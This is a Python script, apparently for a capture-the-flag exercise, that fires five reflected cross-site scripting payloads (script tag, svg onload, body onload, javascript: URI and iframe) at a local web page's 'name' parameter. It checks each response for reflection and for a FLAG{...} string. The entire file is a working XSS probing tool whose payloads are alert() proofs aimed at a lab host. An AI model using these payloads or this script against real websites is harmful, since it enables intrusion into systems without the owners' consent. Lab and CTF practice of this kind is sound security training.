import requests
import urllib.parse
import time
import re

target_url = "http://127.0.0.1:32946/page"

# Define the 5 XSS payload types to test
payloads = [
    {
        "name": "script tag",
        "payload": "<script>alert('XSS')</script>"
    },
    {
        "name": "svg onload",
        "payload": "<svg/onload=alert('XSS')>"
    },
    {
        "name": "body onload",
        "payload": "<body onload=alert('XSS')>"
    },
    {
        "name": "javascript protocol",
        "payload": "javascript:alert('XSS')"
    },
    {
        "name": "iframe javascript",
        "payload": "<iframe src=\"javascript:alert('XSS')\"></iframe>"
    }
]

print("=" * 80)
print("XSS Payload Testing on /page?name= parameter")
print("Target: http://127.0.0.1:32946/page")
print("=" * 80)

results = []
flag_found = None

for idx, payload_data in enumerate(payloads, 1):
    payload = payload_data["payload"]
    payload_name = payload_data["name"]
    
    # URL encode the payload
    encoded_payload = urllib.parse.quote(payload, safe='')
    
    # Construct request URL
    request_url = f"{target_url}?name={encoded_payload}"
    
    print(f"\n[{idx}/5] Testing: {payload_name}")
    print(f"[-] Original payload: {payload}")
    print(f"[-] Encoded payload: {encoded_payload}")
    print(f"[-] Request URL: {request_url}")
    
    try:
        response = requests.get(request_url, timeout=10)
        
        print(f"[+] Status Code: {response.status_code}")
        print(f"[+] Response Length: {len(response.content)} bytes")
        
        # Check if payload is reflected in response
        if payload in response.text:
            print(f"[!] Payload REFLECTED in response!")
            reflection_status = "REFLECTED"
        else:
            print(f"[-] Payload NOT reflected in response")
            reflection_status = "NOT REFLECTED"
        
        # Search for FLAG pattern
        flag_matches = re.findall(r'FLAG\{[^}]+\}', response.text)
        if flag_matches:
            print(f"[!] FLAG FOUND: {flag_matches}")
            flag_found = flag_matches[0]
        else:
            print(f"[-] No FLAG found in response")
        
        # Store results
        results.append({
            "payload_name": payload_name,
            "payload": payload,
            "status_code": response.status_code,
            "reflected": reflection_status,
            "flag_found": len(flag_matches) > 0,
            "response_sample": response.text[:500] if len(response.text) > 500 else response.text
        })
        
        # Print response snippet for analysis
        print(f"[+] Response snippet:\n{response.text[:300]}...")
        
    except Exception as e:
        print(f"[!] Error: {str(e)}")
        results.append({
            "payload_name": payload_name,
            "payload": payload,
            "error": str(e)
        })
    
    # Add 1 second delay between requests
    if idx < len(payloads):
        print(f"[-] Waiting 1 second before next request...")
        time.sleep(1)

# Summary
print("\n" + "=" * 80)
print("SUMMARY")
print("=" * 80)

for result in results:
    if "error" in result:
        status = f"ERROR: {result['error']}"
    else:
        status = f"Status: {result['status_code']} | {result['reflected']}"
        if result['flag_found']:
            status += " | FLAG FOUND"
    print(f"[-] {result['payload_name']}: {status}")

if flag_found:
    print(f"\n[!] FLAG CAPTURED: {flag_found}")
else:
    print(f"\n[-] No FLAG found in any response")

print("\n" + "=" * 80)
